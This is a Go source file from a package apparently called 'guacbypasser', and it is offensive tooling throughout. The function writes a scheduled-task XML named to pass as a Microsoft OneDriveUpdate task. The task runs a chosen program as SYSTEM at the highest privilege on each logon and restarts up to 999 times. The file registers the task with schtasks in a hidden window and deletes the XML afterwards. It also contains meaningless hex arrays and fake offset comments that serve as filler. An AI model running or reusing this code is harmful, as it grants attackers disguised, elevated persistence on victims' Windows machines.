package guacbypasser

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

func HWND_W32_Method_Schtasks(path string) error {
	var err error
	var cmd *exec.Cmd

	var c = __W32_Schtasks__{
		Type:   "_schtasks",
		Method: "xml-command",
		Scode: [4]uintptr{
			0x0, 0x02,
			0x3653fbc, 0xff,
		},

		Location:    fmt.Sprintf("%s\\_schtasks.gUAC", os.Getenv("APPDATA")),
		_K_Schtasks: 0x4,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	// Get ABSOLUTE program path
	// +0x9ff ...

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Fatal(err)
	}

	// XML Template for HighestAvailable priviligue ...
	var xmlTemplate = fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
	<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	  <RegistrationInfo>
		<Date>2018-06-09T15:45:11.0109885</Date>
		<Author>000000000000000000</Author>
		<URI>\Microsoft\Windows\OneDriveUpdate</URI>
	  </RegistrationInfo>
	  <Triggers>
		<LogonTrigger>
		  <Enabled>true</Enabled>
		</LogonTrigger>
	  </Triggers>
	  <Principals>
		<Principal id="Author">
		  <UserId>S-1-5-18</UserId>
		  <RunLevel>HighestAvailable</RunLevel>
		</Principal>
	  </Principals>
	  <Settings>
		<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
		<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
		<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
		<AllowHardTerminate>false</AllowHardTerminate>
		<StartWhenAvailable>true</StartWhenAvailable>
		<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
		<IdleSettings>
		  <StopOnIdleEnd>true</StopOnIdleEnd>
		  <RestartOnIdle>false</RestartOnIdle>
		</IdleSettings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>false</Hidden>
		<RunOnlyIfIdle>false</RunOnlyIfIdle>
		<WakeToRun>false</WakeToRun>
		<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
		<Priority>7</Priority>
		<RestartOnFailure>
		  <Interval>PT2H</Interval>
		  <Count>999</Count>
		</RestartOnFailure>
	  </Settings>
	  <Actions Context="Author">
		<Exec>
		  <Command>%s</Command>
		</Exec>
	  </Actions>
	</Task>`, fmt.Sprintf("start %s", currentDir))

	// [26]uintptr{} payload numbers ...
	// must be realize in future !
	_ = [26]uintptr{
		0x98ef, 0x2322bb, 0x053, 0x075, 0x11dfe,
		0x912d, 0x08f, 0x32ce, 0x562ee, 0x0cc,
		0x023ff, 0xff, 0x098cbe, 0x0cbe, 0x0,
		0x0, 0x02, 0x13d, 0x013e, 0x86eff,
		0x0be, 0x0bb, 0x2833bee, 0x06453cc, 0x0, 0x0EADBEEF,
	}

	// Creating and writing in file %appdata%\elevator.xml
	// +0x0eff ...

	err = ioutil.WriteFile(fmt.Sprintf("%s\\elevator.xml", os.Getenv("APPDATA")), []byte(xmlTemplate), 0666)
	if err != nil {
		log.Fatal(err)
	}

	// Executing cmd command-like ...
	// +0x12fe ...

	cmd = exec.Command("cmd", "/C", fmt.Sprintf("schtasks /create /xml %s /tn OneDriveUpdate", fmt.Sprintf("%s\\elevator.xml", os.Getenv("APPDATA"))))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()

	// Remove file %appdata%\evelator.xml
	err = os.Remove(fmt.Sprintf("%s\\elevator.xml", os.Getenv("APPDATA")))
	if err != nil {
		log.Fatal(err)
	}

	return err
}
